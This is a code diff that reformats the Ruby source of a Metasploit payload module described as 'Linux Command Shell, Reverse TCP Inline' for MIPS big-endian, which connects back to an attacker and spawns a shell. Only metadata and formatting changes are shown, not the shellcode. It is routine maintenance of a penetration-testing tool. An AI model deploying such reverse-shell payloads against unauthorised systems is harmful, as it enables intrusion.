@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 184
 
   include Msf::Payload::Single
@@ -13,33 +11,33 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and spawn a command shell',
-      'Author'        =>
-        [
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Command Shell, Reverse TCP Inline',
+        'Description' => 'Connect back to attacker and spawn a command shell',
+        'Author' => [
           'rigan <imrigan[at]gmail.com>', # Original shellcode
           'juan vazquez' # Metasploit module
         ],
-      'References'    =>
-        [
+        'References' => [
           ['EDB', '18226']
         ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_MIPSBE,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShellUnix,
-      'Payload'       =>
-        {
-          'Offsets' => { },
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_MIPSBE,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShellUnix,
+        'Payload' => {
+          'Offsets' => {},
           'Payload' => ''
-        })
+        }
+      )
     )
   end
 
   def generate
-    if( !datastore['LHOST'] or datastore['LHOST'].empty? )
+    if (!datastore['LHOST'] or datastore['LHOST'].empty?)
       return super
     end
 
